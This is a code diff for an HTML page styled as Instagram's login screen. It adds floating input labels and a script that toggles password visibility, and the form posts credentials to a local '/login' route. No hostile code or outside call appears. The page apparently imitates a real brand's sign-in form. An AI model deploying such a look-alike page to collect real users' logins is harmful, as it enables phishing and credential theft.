@@ -17,10 +17,19 @@
             <div class="loginBox">
                 <form action="/login" method="post">
                     <img src="instagramtext.webp" id="instaText" alt="">
-                    <input type="text" name="ID" id="username" placeholder="Phone number, username, or email"
-                        required>
-                    <input type="password" name="password" id="userPassword" placeholder="Password">
-                    <input type="submit" value="Log in">
+                    <div class="input-wrapper">
+                        <input type="text" name="ID" id="username" required />
+                        <label for="username">Phone number, username, or email</label>
+                    </div>
+
+                    <div class="password-wrapper">
+                        <input type="password" name="password" id="userPassword" required />
+                        <label for="userPassword">Password</label>
+
+                        <img src="show.png" id="togglePassword" class="password-icon" alt="Show/Hide Password" />
+                    </div>
+
+                    <input type="submit" value="Log in" class="login-btn">
                     <p id="or">----------------------&nbsp;&nbsp;&nbsp;OR&nbsp;&nbsp;&nbsp;----------------------</p>
                     <a href="www.facebook.com" id="fb">
                         <img src="facebook.png" id="facebookicon">
@@ -54,5 +63,19 @@
     </div>
 
 </body>
+<script>
+    const passwordInput = document.getElementById("userPassword");
+    const toggleIcon = document.getElementById("togglePassword");
+
+    toggleIcon.addEventListener("click", () => {
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            toggleIcon.src = "invisible.png"; // hide icon
+        } else {
+            passwordInput.type = "password";
+            toggleIcon.src = "show.png"; // show icon
+        }
+    });
+</script>
 
 </html>
